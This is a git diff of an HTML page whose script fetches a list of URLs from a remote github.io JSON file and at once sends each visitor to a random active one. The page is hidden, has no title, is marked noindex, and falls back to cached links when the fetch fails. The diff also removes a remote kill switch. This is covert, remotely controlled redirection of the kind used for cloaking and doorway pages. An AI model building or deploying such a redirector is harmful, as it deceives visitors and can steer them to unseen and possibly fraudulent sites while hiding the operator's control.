@@ -3,62 +3,39 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title></title> <!-- ✅ 不写文字，防止显示标题 -->
-  <style>
-    html, body {
-      background: #fff;
-      margin: 0;
-      padding: 0;
-      height: 100%;
-      overflow: hidden;
-      display: none; /* ✅ 页面内容不渲染 */
-    }
-  </style>
+  <meta name="robots" content="noindex,nofollow">
   <script>
     (async () => {
-      const MAIN_JSON_URL = "https://liuhongliang11895.github.io/888/mapping.json";
-      const CONFIG_URL = "https://liuhongliang11895.github.io/888/config.json";
-      const LOCAL_KEY = "lastActiveLinks";
-      let activeLinks = [];
-
+      // 延迟0毫秒执行，确保HTML标签还没渲染
       try {
-        // 拉取远程开关
-        const conf = await fetch(CONFIG_URL + "?ts=" + Date.now(), { cache: "no-store" }).then(r => r.json());
-        if (!conf.enableRedirect) {
-          document.open();
-          document.write(`<h2>${conf.safeTitle || "Content temporarily unavailable."}</h2>`);
-          document.close();
-          return;
-        }
+        const MAIN_JSON_URL = "https://liuhongliang11895.github.io/888/mapping.json";
+        const LOCAL_KEY = "lastActiveLinks";
+        let activeLinks = [];
 
-        // 拉取主仓库链接
         const res = await fetch(MAIN_JSON_URL + "?ts=" + Date.now(), { cache: "no-store" });
         const data = await res.json();
         activeLinks = data.links.filter(l => l.active);
+
         if (!activeLinks.length) throw new Error("No active links");
 
-        // 缓存备用
+        // 缓存
         localStorage.setItem(LOCAL_KEY, JSON.stringify(activeLinks));
 
-        // ⚡ 立即随机跳转（毫秒级）
-        const idx = Math.floor(Math.random() * activeLinks.length);
-        location.replace(activeLinks[idx].url);
+        // 立即跳转（⚡零渲染）
+        location.replace(activeLinks[Math.floor(Math.random() * activeLinks.length)].url);
 
-      } catch (err) {
-        // 失败回退
-        console.error("Redirect failed:", err);
-        activeLinks = JSON.parse(localStorage.getItem(LOCAL_KEY) || "[]");
-        if (activeLinks.length) {
-          location.replace(activeLinks[Math.floor(Math.random() * activeLinks.length)].url);
+      } catch (e) {
+        console.error("Redirect failed:", e);
+        const cached = JSON.parse(localStorage.getItem("lastActiveLinks") || "[]");
+        if (cached.length) {
+          location.replace(cached[Math.floor(Math.random() * cached.length)].url);
         } else {
-          document.open();
-          document.write("<h2>System maintenance, please try again later.</h2>");
-          document.close();
+          document.write("<html><body></body></html>");
         }
       }
     })();
   </script>
 </head>
-<body></body>
+<body style="display:none;"></body>
 </html>
 
